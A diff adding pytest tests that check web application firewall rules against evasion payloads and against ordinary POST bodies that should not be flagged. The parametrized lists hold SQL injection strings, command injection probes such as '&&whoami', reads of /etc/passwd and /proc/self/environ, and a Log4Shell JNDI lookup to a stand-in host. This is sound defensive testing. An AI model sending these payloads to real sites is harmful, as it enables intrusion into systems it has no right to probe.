@@ -260,3 +260,96 @@ def test_the_updater_clears_rule_files_left_by_earlier_deletes():
     # It may only delete a rules file whose vhost directory is gone.
     assert 'if [[ -n "$rules_domain" && ! -d "$OLS_VHOSTS_DIR_CLEAN/$rules_domain" ]]' in block
     assert "rm -rf" not in block
+
+
+# --------------------------------------------------------------------------
+# Evasion. Every payload below got through the first version of these rules on
+# a live site; the transformations and widened patterns are what stop them.
+# --------------------------------------------------------------------------
+
+def _match(rule_id: str, value: str) -> bool:
+    """Apply the rule's transformations, then its pattern."""
+    import re as _re
+    from urllib.parse import unquote
+
+    line = _rule(rule_id)["rules"].splitlines()[0]
+    actions = line.rsplit('"', 2)[-2]
+    text = value
+    if "t:urlDecodeUni" in actions:
+        text = unquote(unquote(text))
+    if "t:removeComments" in actions:
+        text = _re.sub(r"/\*.*?\*/", "", text, flags=_re.S)
+    if "t:compressWhitespace" in actions:
+        text = _re.sub(r"\s+", " ", text)
+    return bool(_operand(rule_id).search(text))
+
+
+@pytest.mark.parametrize("payload", [
+    "?id=1 UN/**/ION SE/**/LECT 1",          # comment splitting
+    "?id=1 UNION%0aSELECT 1",                 # newline separator
+    "?id=1 UNION%09SELECT 1",                 # tab separator
+    "?id=1 UnIoN sElEcT 1",                   # case mixing
+    "?id=1 UNION     SELECT 1",               # padding
+    "?id=1 UNION(SELECT(1))",                 # parentheses, no whitespace
+    "?id=1 or 1 like 1",                      # like instead of =
+    "?id=1 or 'a'='a",                        # string tautology
+    "?id=1 or 2>1",                           # numeric comparison
+    "?id=1 AND sleep (5)",                    # space before the paren
+])
+def test_sql_injection_evasions_are_caught(payload):
+    assert _match("sql-injection", payload), payload
+
+
+@pytest.mark.parametrize("payload", [
+    "?c=%26%26whoami",                        # && chained command
+    "?c=x%0Als",                              # newline then a command
+    "?f=file:///etc/passwd",                  # file:// wrapper
+    "?x=%24%7Bjndi%3Aldap%3A//evil/a%7D",     # Log4Shell lookup
+])
+def test_command_injection_evasions_are_caught(payload):
+    assert _match("command-injection", payload), payload
+
+
+@pytest.mark.parametrize("payload", [
+    "?f=/etc/passwd",                         # absolute, no traversal
+    "?f=/proc/self/environ",
+    "?f=%2e%2e%2f%2e%2e%2fetc/passwd",
+])
+def test_file_read_attempts_are_caught(payload):
+    assert _match("php-path-traversal", payload), payload
+
+
+@pytest.mark.parametrize("rule_id", ["sql-injection", "command-injection", "php-path-traversal"])
+def test_injection_rules_inspect_post_bodies_too(rule_id):
+    # ARGS covers ARGS_GET and ARGS_POST. Scoping to ARGS_GET left the most
+    # common injection vector -- a form POST -- completely uninspected.
+    assert "REQUEST_URI|ARGS " in _rule(rule_id)["rules"]
+    assert "ARGS_GET" not in _rule(rule_id)["rules"]
+
+
+@pytest.mark.parametrize("rule_id", ["sql-injection", "command-injection", "php-path-traversal", "xss"])
+def test_injection_rules_decode_before_matching(rule_id):
+    body = _rule(rule_id)["rules"]
+
+    assert "t:urlDecodeUni" in body
+    assert "t:removeComments" in body
+
+
+def test_command_injection_does_not_compress_whitespace():
+    # It folds the newline in `x%0Als` into a space, which is the only signal
+    # separating a chained command from ordinary text.
+    assert "t:compressWhitespace" not in _rule("command-injection")["rules"]
+
+
+@pytest.mark.parametrize("body", [
+    "comment=Bai viet hay qua&author=Nguyen Van A",
+    "s=ao so mi nam gia duoi 500k&post_type=product",
+    "content=Huong dan select du lieu from bang san pham trong MySQL",
+    "content=Cong doan va lien minh union trong doanh nghiep",
+    "action=heartbeat&screen_id=dashboard",
+    "billing_address_1=So 12 Nguyen Trai&order_comments=Giao gio hanh chinh",
+    "log=admin&pwd=Tr0ng@2026#xyz",
+])
+def test_real_post_bodies_are_not_injections(body):
+    for rule_id in ("sql-injection", "command-injection", "php-path-traversal"):
+        assert not _match(rule_id, body), f"{rule_id}: {body}"
